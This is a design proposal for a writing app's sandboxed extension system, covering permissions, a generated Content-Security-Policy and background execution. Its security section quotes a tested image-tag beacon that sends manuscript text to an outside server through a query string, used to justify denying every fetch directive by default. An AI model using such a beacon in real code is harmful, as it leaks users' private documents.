# Extension system v2 — design

Status: **proposal, for decision.** Nothing here is built yet.

**Start at §0.** It scopes everything below to the fact that there is one
extension, written by us, and no public release — which cuts the 1.1.20 build
list to four items and defers the rest with reasons.

§11 records the runtime alternatives and why the isolated-process manager is
the destination rather than the starting point. §12 specifies background
extensions, which are a confirmed requirement and which constrain what v2 must
get right *before* anything is built on it.

This document decides how AuthNo extensions work in 1.1.20. It exists because
v2 is not an addition to v1 — it changes the trust model, and the trust model
has to be settled before any of the features on top of it are worth building.

Where a claim is marked **measured**, it was run in Chromium in this repo and
the result is quoted. Everything else is argument, and is labelled as such.


---

## 0. Scope: there is one extension and no public release

This section was added after the rest and outranks it. Read it first.

**The threat model most of this document assumes does not exist yet.** AuthNo
is not publicly released, and Cloud Backup is the only extension — written by
the same people who write AuthNo. There is no untrusted author, so a permission
system defending against one is defending against nobody.

That is not an argument for building it later badly. It is an argument for
building much less of it now, and being honest about why the rest is deferred.

### What actually stops being true

Almost nothing here is a one-way door **while there is one first-party
extension**, because we control the only consumer. `apiVersion`, the manifest
shape, the capability names, even the wire format can all change with a commit
to a repository we own. The usual argument for settling an API early — that
breaking it strands third parties — has no force yet.

So the honest ranking is not "what is architecturally important" but "what is
cheaper today than it will ever be again".

### The 1.1.20 scope

**Build, because it fixes what is actually broken:**

1. **`page` / `command` / `panel` contributions and `when` clauses** (§5). This
   is the original complaint: every button opens the same page, and two of
   Cloud Backup's three pages are unreachable. Nothing about it is
   speculative.
2. **The declarative settings schema** (§6). It deletes `Settings.js` outright
   and makes the settings page look like the app. Pure subtraction for the one
   extension that exists.
3. **`apiVersion` in the manifest.** One line. Not because it is
   irreversible — it is not — but because it costs nothing and removes a
   guessing game later.

**Build, on one narrow argument:**

4. **Permissions declared in the manifest, and the CSP generated from them**
   (§3.2, §4). Not because there is an attacker. Because *enforcing a boundary
   is free when there is one extension to fix and never free again.* When the
   network permission lands, every extension whose host list is wrong breaks.
   Today that is one extension, written by us, with a test. At twenty
   extensions by twenty authors it is a migration with a support queue.

   The permission *prompts* can come later. The declaration and the CSP are the
   half that gets more expensive with time.

**Defer, and say so rather than half-building:**

- Onboarding flows (§7) — a tutorial for one first-party extension nobody has
  installed yet.
- Permission prompt UI (§7) — needs a second author to mean anything.
- Budgets, the hosts-contacted panel (§3.3, §12.4) — real, and worth nothing
  until there is something to audit.
- The isolated-process manager (§11.2) — the two-engine cost is only worth
  paying for a problem we do not have.
- Background execution (§12) — **but see below.**

### The one thing worth deciding early anyway

§12.3's rule — the background entry point gets no DOM — is the exception,
because it is the only item here whose cost genuinely grows with *extensions
written*, not with *extensions published*. It is one lint rule now. If
background work ships without it and three extensions come to rely on
`document`, the process-manager migration acquires a reason to never happen.

Cheap enough to take on a maybe.

### The argument that survives having one extension

Worth separating from the security case, because it is a different argument and
a better one for this app.

AuthNo's whole pitch is that your work stays on your device. An extension that
uploads every manuscript to Dropbox is a reasonable thing to want and a
reasonable thing to install — and the writer should be able to see that it does
that, in words, whether or not the author is trustworthy.

That is a transparency feature, not a security feature. It is worth building
for a first-party extension precisely because we cannot claim the app keeps
your work local and then ship an extension that does not, without saying so.

---

## 1. What v1 actually is today

Worth being precise, because the gap is larger than it looks.

**Extensions are already isolated from the app.** Since 1.1.19-beta.5 both
extension frames carry `sandbox="allow-scripts"` and nothing else. The frame
gets an opaque origin: `parent.anything` throws, there is no localStorage of
its own, and `postMessage` is the only way out. That part is done and checked
in a real browser by `npm run check:sandbox`.

**Extensions are not isolated from your books.** Every extension gets all
sixteen capabilities the host answers:

```
storage.get  storage.set  storage.keys  toast  navigate
openBrowser  closeBrowser  oauth  googleSignIn  requestDriveToken
getSessions  importSession  replaceSession  encodeSession
exportSessionAs  registerHook
```

`getSessions` returns the library. `encodeSession` turns a book into bytes.
`openBrowser` opens any https URL. Nothing in the manifest declares which of
these an extension wants, nothing at install time asks, and nothing at runtime
refuses. An extension that says it tidies chapter headings can read every
manuscript you own and post it somewhere, and the only sign is that it asked to
be installed.

**Contributions can only open a page, and only one page.** The manifest schema
already supports several — Cloud Backup declares `settings`, `conflict` and
`cloud-files` — but every contribution it can make points at `settings`, and
two of its three pages are unreachable. There is no way to say "this button
runs a command" rather than "this button opens a page".

**The manifest validates four fields.** `id`, `name`, `version`, and that the
id has no path separators in it. That is the whole schema.

So v2 is not "add permissions to v1". It is the first version where the
manifest means anything.

---

## 2. The runtime: what language extensions are written in

**Decision: JavaScript and WebAssembly, in the sandboxed frame. Not a new
language, not a plugin host, not native code.**

The constraint that settles this is one you named: extensions must run inside
AuthNo on both Android and desktop, not as separate processes. AuthNo is a
React app in a WebView on Android and in Electron on desktop. The only
execution engine guaranteed to exist in both, with the same semantics, is the
JavaScript engine already running the app.

The alternatives, and why each loses:

| option | why not |
|---|---|
| Native plugins (`.so`/`.dll`) | Two toolchains, two ABIs, and code with the app's full OS privileges. The sandbox stops being a boundary. |
| A scripting language (Lua, Python) | Means shipping an interpreter — megabytes to the APK, a second debugger story, a second FFI to audit, and no browser sandbox around it. |
| A custom DSL | Solves capability control by being weak, then spends years growing back into a language. Nobody wants to learn it. |
| **JS + WASM in the frame** | The engine is already there, on both platforms. The browser enforces the boundary rather than us. WASM covers the "I want to write it in Rust/Go/C++" case with no work on our side. |

WASM matters more than it sounds: an author who wants Rust compiles to
`.wasm`, and it loads inside the same frame with the same permissions, because
`WebAssembly.instantiate` is just another API the frame has. We do not have to
build or support anything for that to be true.

**What v2 adds is not a new language. It is a real API surface and a real
boundary around it.**

### TypeScript

First-class in the *tooling*, not the runtime. `extbk build` type-checks
against a published `@authno/extension-types` package and emits plain JS. The
runtime never sees types. This is how VS Code does it and it is the cheapest
possible win: authors get completion for all sixteen capabilities and every
permission name.

---

## 3. Security: the two things you asked about

### 3.1 "Extensions must not be able to reverse-engineer the app"

Largely already true, and worth stating exactly how far it goes.

The frame has an opaque origin, so `parent.*` throws — not returns undefined,
*throws*, cross-origin. Extension code cannot read the app's modules, its
variables, its DOM, or its localStorage. It sees the sixteen message types the
host answers and nothing else. **Measured** in `check:sandbox` and again under
load in `stress:extensions`.

What is *not* protected, and cannot be: the app's own JavaScript bundle is
shipped to the device. Anyone who installs AuthNo can read `main.<hash>.js`
with a text editor. That is true of every web-technology app and no amount of
minification changes it — minification is a speed bump measured in hours. **We
should not claim otherwise anywhere in the docs or the store listing.**

The honest framing: an extension cannot reach *into a running AuthNo*. Nobody
can stop a determined person reading the shipped bundle offline. Those are
different threats and only the first one matters for extension safety.

The reverse — protecting an *extension author's* code from users — is also not
achievable and should not be promised. `.extbk` can obfuscate; it cannot
encrypt, because the device has to run the code and therefore has to hold the
key. If a marketplace ever sells extensions, the thing that makes them worth
buying has to be a service or an update stream, not secret source.

### 3.2 "Extensions must not be able to steal manuscripts"

This is the one that needs new machinery, and it needs it in two places.

**The API side** is the permission model in §4: `getSessions` simply is not
answered unless the manifest declared `library:read` and the writer granted it.

**The network side is the harder half, and it is where a naive design fails.**
An extension's `fetch` runs in its own realm. The host cannot hook it — you
cannot patch a function in another window you have no reference into. If the
extension can reach the network at all, then any capability that hands it text
is an exfiltration path, and the permission model above is decoration.

The only thing that can bind a frame's network access is the browser. A
`Content-Security-Policy` in the frame document does exactly that, and the
policy is generated by the host from the manifest, so the extension never
chooses it.

Four things had to be true. All four were **measured** in Chromium:

| question | result |
|---|---|
| Is a `<meta http-equiv="Content-Security-Policy">` in a `srcdoc` document enforced? | **Yes.** `connect-src 'none'` blocked a fetch that otherwise succeeded. |
| Can the extension remove the meta tag afterwards? | **No.** Removed it, then fetched: still blocked. The policy is bound at parse time. |
| Can it inject a wider policy? | **No.** Injecting `connect-src *` changed nothing — policies compose as intersection, never union. |
| Can it escape through XHR, or a nested iframe of its own? | **No.** Both blocked; a child frame inherits. |

And then the result that shaped the whole design:

> With `connect-src 'none'`, an `<img src="http://…/leak?manuscript=CHAPTER-ONE">`
> **reached the server.** With `default-src 'none'`, the server saw no request
> at all.

`connect-src` does not cover images. A manuscript leaves perfectly well one
query string at a time through `new Image().src`, and a policy that names
`connect-src` would have looked airtight while leaking.

**So the rule is: the generated policy is built from `default-src 'none'` and
grants are added explicitly.** Never the other way round. Every fetch
directive — `img-src`, `media-src`, `font-src`, `form-action`, `frame-src`,
`worker-src`, `connect-src` — has to be denied by default, because each is a
channel and only one of them is called "connect".

A network permission is therefore not a boolean. It is a host list, compiled
into the policy:

```
default-src 'none';
script-src 'unsafe-inline' blob:;      /* the extension's own modules */
style-src  'unsafe-inline';
img-src    'self' data: blob: https://api.dropbox.com;
connect-src https://api.dropbox.com https://content.dropboxapi.com;
form-action 'none';
```

An extension granted no network permission gets `default-src 'none'` with only
the script and style grants it needs to render, and there is then **no channel
out of the frame at all** except `postMessage` to the host — which the host
audits.

### 3.3 The residual risk, stated plainly

A permission model moves the decision to the writer. It does not remove it. An
extension that legitimately needs `library:read` *and* a network host — a cloud
backup extension needs precisely that — can send manuscripts to its own server,
because that is the feature. What v2 buys is that the writer was asked, in
words, and can see afterwards which extension holds which grant. That is the
achievable goal; "safe by construction" is not, and we should not write it.

Two things narrow it further and are worth building:

- **Grant the narrow scope by default.** `library:read` should be
  `library:read:current` (the open book) unless the extension asks for
  `library:read:all` and says why.
- **Show the traffic.** A per-extension panel listing the hosts it has actually
  contacted, with counts. Cheap, because the CSP already enumerates the only
  hosts it *can* contact, and it turns an abstract grant into something a
  writer can check.

---

## 4. The permission model

### 4.1 Declared in the manifest

```jsonc
{
  "id": "cloud-backup",
  "apiVersion": 2,
  "permissions": {
    "library:read:all":  { "reason": "To upload every book, not just the open one." },
    "library:write":     { "reason": "To restore a book you pick from the cloud." },
    "network": {
      "hosts": ["https://api.dropbox.com", "https://content.dropboxapi.com"],
      "reason": "To talk to Dropbox."
    },
    "notifications":     { "reason": "To tell you when a sync fails." },
    "widgets":           { "reason": "To show sync status on your home screen." }
  }
}
```

`reason` is **required** and is shown verbatim to the writer. An extension that
cannot explain why it wants your library in one sentence has told you
something.

### 4.2 The permission set

Deliberately small. Each one is a sentence a writer can answer, not a
capability name.

| permission | what it unlocks | prompt reads |
|---|---|---|
| `library:read:current` | the open book | "Read the book you have open" |
| `library:read:all` | `getSessions` | "Read all your books" |
| `library:write` | `importSession`, `replaceSession` | "Add and change books" |
| `library:export` | `exportSessionAs`, `encodeSession` | "Turn your books into files" |
| `network` | `fetch`/`img` to the named hosts | "Connect to the internet (dropbox.com)" |
| `notifications` | post a system notification | "Send you notifications" |
| `widgets` | contribute a home-screen widget | "Add widgets to your home screen" |
| `browser` | `openBrowser`, `oauth` | "Open pages in your browser" |
| `storage` | its own key-value space | *(not prompted — always granted, already namespaced and private)* |

Three notes on the shape:

- **`network` names hosts, never `true`.** The prompt says which. "Connect to
  the internet" with no name is a question nobody can answer well.
- **`storage` is not a prompt.** It is already per-extension and invisible to
  others; asking about it trains people to tap through prompts.
- **Everything not listed is refused,** which is the property `dispatch`
  already has and simply needs wiring to a grant table.

### 4.3 Enforced in one place

`dispatch` is already the single switch every capability goes through. It gains
one line per case:

```js
case 'getSessions':
  requirePermission(ctx, 'library:read:all');
  return handlers.getSessions?.() ?? [];
```

`requirePermission` throws a refusal the extension can catch and explain. The
check must live *in* `dispatch` and nowhere else — the lesson from the sandbox
bug is that a boundary enforced in two places is enforced in one.

A check will assert that every `case` in `dispatch` either names a permission
or is on a short explicit free-list. That is the mechanism that stops capability
seventeen shipping ungated.

---

## 5. Multiple pages, and contributions that are not pages

The manifest already has a `pages` map. What is missing is that a contribution
can only *open* one.

```jsonc
"contributes": {
  "settings":  [{ "id": "cb-settings", "label": "Cloud Backup", "page": "settings" }],
  "bookActions": [
    { "id": "backup-now", "label": "Back up now", "command": "sync.now" },
    { "id": "history",    "label": "Cloud history", "page": "cloud-files" }
  ],
  "editorToolbar": [{ "id": "wordcount", "label": "Live stats", "panel": "stats" }]
}
```

Three kinds of target, and the distinction is the fix:

- **`page`** — opens a full page from the `pages` map. Several buttons, several
  pages. This is what is broken today.
- **`command`** — calls a function the extension registered with
  `host.registerCommand('sync.now', fn)`. No UI at all. "Back up now" should
  back up, not open a settings screen.
- **`panel`** — a small surface docked beside the editor rather than a page.
  Ships in 1.1.20; the editor wins every layout conflict with it (spec §4a).

Plus **`when`** clauses, so a contribution appears only where it makes sense:

```jsonc
{ "id": "backup-now", "label": "Back up now", "command": "sync.now",
  "when": "book.isSaved && ext.hasPermission('network')" }
```

A tiny expression language — property lookups, `&&`, `||`, `!`, comparison —
evaluated on the host against a fixed context object. Not `eval`, and not
Turing-complete: it decides visibility, and a visibility rule that can loop is
a bug generator.

---

## 6. The native settings page

**Decision: the app renders it from a declarative schema. The extension does
not build it.**

This is the single biggest quality win available, and it costs authors less
work, not more:

```jsonc
"settings": {
  "schema": [
    { "key": "provider", "type": "select", "label": "Cloud provider",
      "options": ["Google Drive", "Dropbox", "WebDAV"], "default": "Google Drive" },
    { "key": "interval", "type": "number", "label": "Sync every", "suffix": "minutes",
      "min": 5, "max": 1440, "default": 30 },
    { "key": "wifiOnly", "type": "toggle", "label": "Only on Wi-Fi", "default": true },
    { "key": "account",  "type": "action", "label": "Connect account", "command": "auth.connect" }
  ]
}
```

Why this beats a custom page for most extensions:

- It looks like AuthNo, because it *is* AuthNo — same controls, same theme,
  same dark mode, same accessibility, same behaviour under Material You.
- Values land in the extension's storage automatically. No bridge code.
- It renders identically on a phone and a laptop with no responsive work.
- **It needs no frame**, so a settings-only extension can be granted nothing at
  all and still be configurable.

The app-native settings page also hosts the parts the extension does *not*
own: version, author, install date, the permission list with per-permission
toggles, the hosts-contacted panel from §3.3, and Uninstall.

A custom `ui-file` page stays available for genuinely custom UI — the conflict
resolver is a real example — but it should be the exception, and the docs
should say so.

---

## 7. Install → onboarding → permissions

Order matters, and the order you proposed is the right one. Teach first, then
ask.

```
  ┌────────────┐    ┌─────────────┐    ┌──────────────┐    ┌─────────┐
  │  Install   │ →  │  Onboarding │ →  │  Permissions │ →  │  Ready  │
  │  (verify)  │    │  (optional) │    │   (asked)    │    │         │
  └────────────┘    └─────────────┘    └──────────────┘    └─────────┘
                          skip ↓              ↓ deny all
                    ┌───────────────────────────────────┐
                    │  Installed, inert, still uninstall │
                    └───────────────────────────────────┘
```

**Onboarding** is declarative, for the same reasons as the settings page — and
because an onboarding flow that can run arbitrary code before any permission
has been granted is exactly the wrong place for arbitrary code:

```jsonc
"onboarding": {
  "steps": [
    { "title": "Your books, backed up",
      "body": "Cloud Backup copies your .authbook files to a cloud account you own.",
      "image": "onboarding/1.png" },
    { "title": "You choose the provider",
      "body": "Google Drive, Dropbox or any WebDAV server.",
      "image": "onboarding/2.png" }
  ]
}
```

Omit the key and there is no onboarding. Two to five steps; the app should
refuse to render more, because an onboarding somebody cannot finish is a
tutorial nobody reads.

**Permission prompts** come after, one screen, all requests listed with their
reasons, and each individually refusable:

```
  Cloud Backup would like to:

  ☑  Read all your books
      "To upload every book, not just the open one."

  ☑  Connect to the internet — api.dropbox.com, content.dropboxapi.com
      "To talk to Dropbox."

  ☐  Send you notifications
      "To tell you when a sync fails."

           [ Not now ]              [ Allow selected ]
```

Four rules that matter more than the visual:

1. **Deny is always available and never fatal.** A denied extension installs
   and runs inert. It must not crash, and its own UI should say what it cannot
   do.
2. **Every grant is revocable later**, from the native settings page, with the
   same wording.
3. **New permissions in an update re-prompt**, and only for the new ones. An
   update must never silently widen a grant.
4. **The runtime re-reads grants**, so revoking takes effect without a restart.

---

## 8. Additions worth building that you did not name

Ordered by value per unit of work.

1. **A capability audit check in CI.** Every `case` in `dispatch` must name a
   permission or be on an explicit free-list. This is the check that keeps the
   model true in a year, and it is about thirty lines.
2. **`apiVersion` in the manifest, refused if unknown.** v1 extensions must not
   silently load into a v2 runtime and get every capability by default. This is
   the migration hazard and it wants deciding on day one, not later.
3. **Hosts-contacted panel** (§3.3). Turns a grant into something checkable.
4. **A dev-mode hot reload.** `extbk watch` already rebuilds; the app can watch
   the extensions directory and restart a changed extension. The current loop is
   build → install → restart, and it is the main reason writing an extension is
   unpleasant.
5. **Structured errors to the author.** An extension that throws in `activate()`
   currently produces a toast. It should produce a per-extension log the author
   can read from the native settings page.
6. **A `dry-run` permission mode for the sandbox harness**, so an author can see
   exactly which permission each of their calls requires before shipping.
7. **Signed extensions, eventually.** Not for 1.1.20. Worth designing the
   manifest so a `signature` block can be added without a format break — the
   `.extbk` container already has room.

---

## 9. Migration, and what it costs

Cloud Backup 1.5.0 is the only real extension and the migration is small,
which is the argument for doing this now rather than at ten extensions.

| v1 | v2 |
|---|---|
| no `apiVersion` | `"apiVersion": 2` |
| no permissions | `library:read:all`, `library:write`, `network`, `notifications` |
| `Settings.js` — a hand-built UI page | a `settings.schema` block; the file shrinks or goes |
| `backup-now` → `page: "settings"` | `command: "sync.now"` |
| `conflict`, `cloud-files` unreachable | reachable, via their own contributions |
| `"tier": "premium"` | unchanged |

**The breaking change to be explicit about:** a v1 extension loaded by a v2
runtime must be refused, not adapted. Adapting it means guessing its
permissions, and the only safe guess is "all of them" — which is the thing
being fixed. `apiVersion` absent ⇒ v1 ⇒ refuse with a message naming what to
add.

---

## 10. What is decided and what is not

**Decided by measurement, not preference:**

- JS + WASM in the sandboxed frame. Nothing else runs on both platforms in one
  engine.
- Network permission enforced by a host-generated CSP built from
  `default-src 'none'`. Verified enforceable, verified tamper-proof, and
  verified that the obvious weaker version (`connect-src`) leaks through an
  image.

**Open, and wanting your call:**

1. **Is `network` grantable at all to a non-store extension?** A sideloaded
   `.extbk` with `library:read:all` + `network` is, by construction, able to
   upload your manuscripts. The prompt says so. Is a prompt enough, or should
   that combination require something stronger?
2. **Does `library:read:all` need a per-book scope?** "This extension can read
   *these three* books" is friendlier and materially more work.
3. **How strict is the onboarding cap?** I suggest a hard refusal above five
   steps.
4. ~~**Do we ship `panel` in 1.1.20**, or land `page` + `command` + `when` first
   and add panels in 1.1.21?~~ **Decided: 1.1.20.** Panels do touch the editor
   layout, which is the most delicate surface in the app — so the spec constrains
   them from the editor's side rather than the extension's. A 45-character
   measure floor the panel yields to, no focus movement on open, no per-keystroke
   hook, and a bottom sheet instead of a side dock on phones. See spec §4a.
5. **Does `background` ship in 1.1.20 at all, or only the permission?** The
   argument for declaring it now and honouring it later: extensions written
   against it keep working, and §12.3's no-DOM rule only helps if it lands
   before anyone writes background code.
6. **Is desktop "background" worth having at all in v1 of it**, given it can
   only mean "AuthNo is running but not visible"? A prompt that promises less
   on the platform where people expect more may be worse than not offering it.

Two things in §11 and §12 are decisions I have taken rather than options —
say so if you disagree:

- The runtime moves to an isolated-process manager **eventually**, not in
  1.1.20, because of the two-JS-engine cost in §11.2.
- The background entry point is **denied the DOM from v2 onward**, before the
  runtime that requires it exists, because retrofitting it later breaks every
  background extension written in between.

---

## 11. Alternatives considered for the runtime

Recorded because the reasoning is not obvious and will be re-proposed
otherwise. All three were argued through; one of them is where we are going.

### 11.1 Extensions as separate APKs (the Mihon model)

Mihon/keiyoushi extensions are `.apk` files installed as ordinary Android apps,
and the host shows a **Trust** prompt before using one. That prompt *is* the
security model — signature trust, not containment. A Mihon extension runs with
the host's own access.

Reasonable for a manga reader. Wrong here, for a specific reason: **a separate
APK declares its own `INTERNET` permission**, which on Android is a *normal*
permission — granted at install, never prompted, not revocable. AuthNo would
have no say in where a manuscript goes after handing it over, and no way to
acquire one. It also costs `REQUEST_INSTALL_PACKAGES` (Play-restricted) or a
Play listing per extension, and makes `.extbk` pointless.

Rejected: it is strictly weaker than what we have, on the exact axis we care
about.

### 11.2 An AuthNo-owned extension process manager

**Accepted as the destination.** Not as the 1.1.20 implementation.

The idea: extensions run in processes AuthNo owns and supervises, rather than
in a frame. Android has the exact primitive for this —

> `android:isolatedProcess="true"` — "this service runs under a special process
> that is isolated from the rest of the system and **has no permissions of its
> own**. The only communication with it is through the Service API."

Own UID, no `INTERNET`, no filesystem, Binder only. It is what Chrome uses for
renderers. Every objection to §11.1 disappears: no separate APK, no Play
listing per extension, still a `.extbk`, and the host is back in the path of
every byte — enforced by the kernel rather than by the browser.

**On desktop the jail must still be Chromium's.** A plain Node child process
has full filesystem and network, which is *worse* than today. Matching
Android's guarantee means seccomp-bpf on Linux and AppContainer on Windows;
Electron already ships both as the renderer sandbox. The manager should be our
code — lifecycle, policy, IPC, supervision — and the cell it puts extensions in
should be Chromium's, because writing that ourselves is a multi-year security
project maintained by one person.

**The cost, stated plainly:** an isolated Android process cannot use WebView —
WebView needs system services an isolated process cannot reach. So it needs an
embedded engine (QuickJS, Hermes, J2V8; 1–3 MB), which is *not* the engine the
desktop renderer runs. Two engines means divergent `Intl`, regex corners and
`Date` edges, and "works on my laptop, fails on my phone" bugs. That is the
real price and it is why this is the destination rather than the starting
point.

### 11.3 The frame runtime (v2 as specified above)

One engine on both platforms, boundary enforced by a host-generated CSP,
measured. What ships in 1.1.20.

### 11.4 What makes the choice reversible

**The runtime is an implementation detail behind `dispatch`.** Permissions, the
manifest, contributions, onboarding and the capability list are identical
either way. Three rules keep it that way, and all three cost nothing now and a
rewrite later:

1. **`dispatch` takes a message, not a call.** It must never be invoked as a
   direct function from anything that assumes a shared heap. It already speaks
   `postMessage`; Binder and a socket carry the same envelopes.
2. **Everything crossing the boundary is structured-cloneable.** No functions,
   no DOM nodes, no class instances. `toSendable` already exists for this and
   must stay mandatory.
3. **The background entry point gets no DOM** — see §12.3. This is the one that
   would be expensive to retrofit.

---

## 12. Background extensions

Confirmed as a requirement, so it is specified now rather than bolted on. The
permission is `background`, and it is the most consequential one in the set.

### 12.1 It does not mean the same thing on both platforms

Worth stating before anything is promised in a UI:

| | Android | desktop |
|---|---|---|
| App visible | yes | yes |
| App backgrounded / minimised | yes | yes |
| App fully closed | **yes** — a service can run | **no**, unless we ship a login-item daemon |
| Device asleep | subject to Doze and App Standby | subject to OS sleep |

Desktop "background" realistically means *AuthNo is running, the window is
not visible*. Making it mean more requires a launch agent / scheduled task —
a separate installed thing, which is the design rejected in §11.1 arriving by
another door. **The permission prompt must not imply more than the platform
gives**, and the docs should say which is which.

### 12.2 How it runs

The extension never gets a scheduler of its own. It declares intent; AuthNo
owns the timer.

```jsonc
"background": {
  "command": "sync.run",        // registered with host.registerCommand
  "minInterval": 900,           // seconds; floor enforced by the host
  "requires": ["network"],      // skip the wake entirely if not granted
  "constraints": { "network": "unmetered", "charging": false }
}
```

- **Android:** `WorkManager` periodic work, not `AlarmManager`. Its 15-minute
  floor is a platform constraint, not ours, and `minInterval` is clamped to it.
  WorkManager also handles Doze, reboot persistence and the constraint set,
  which is a large amount of correctness we would otherwise write badly.
- **Desktop:** a timer in the Electron main process waking a hidden sandboxed
  renderer.

The wake sequence is the same on both: host wakes → creates the extension
context → runs the one named command → tears the context down. **Extensions do
not stay resident.** A background extension that is merely *alive* is a battery
complaint with our name on it.

### 12.3 The constraint this puts on v2, today

Under the process manager, background code runs in an isolated process with an
embedded engine — **and no DOM.** Today it runs in a hidden iframe, which has
one.

So: **the background entry point must be forbidden from touching the DOM from
v2 onward**, even though v2's runtime would allow it. `document`, `window.*`
beyond the host API, `fetch` (it goes through the host), timers beyond the wake
window. The sandbox harness should fail a build that uses them.

If we skip this, every background extension written for v2 breaks on the day
the runtime swaps, and the swap becomes a migration nobody wants to schedule.
It is one lint rule now.

### 12.4 The budget

Enforced by the host, per extension:

| limit | why |
|---|---|
| Wall-clock per wake (30 s, then killed) | one extension must not hold a wakelock |
| Wakes per day | stops `minInterval` gaming |
| Bytes per wake | a sync that grows without bound is a bug worth surfacing |
| Consecutive-failure backoff | an extension failing every 15 min forever is a battery drain nobody attributes to it |

All four visible in the native settings page, per extension, next to the
hosts-contacted panel from §3.3. "This extension woke 48 times today and failed
47 of them" is the sentence that gets a bad extension uninstalled.

### 12.5 The combination that needs saying out loud

`background` + `network` + `library:read:all` is, together, *an extension that
can send your manuscripts anywhere while you are not looking.*

That is not hypothetical and it is not a flaw — it is exactly what Cloud Backup
is for, and the same three permissions any competitor would need. But the three
prompts individually do not say it, and a writer tapping through them will not
assemble it themselves.

So the permission screen should name the combination when all three are asked
for, in one sentence, once:

> Together, these let Cloud Backup send your books to the internet while AuthNo
> is closed. That is what it is for — but it is worth knowing.

Not a scare dialog and not an extra tap. One sentence that makes the grant
legible, and the hosts-contacted panel to check it against afterwards.

### 12.6 The pre-existing hazard it inherits

`docs/known-issues.md` already records that OEM battery managers silently drop
repeating alarms — that is a live problem for *reminders*, which are far
cheaper than a sync. Background extensions inherit it and will be hit harder.

The honest position: background work is **best-effort on Android and always
will be**, the settings page must show when an extension last actually ran
rather than when it was scheduled to, and the existing "your phone may be
stopping this" row should be reused rather than reinvented.
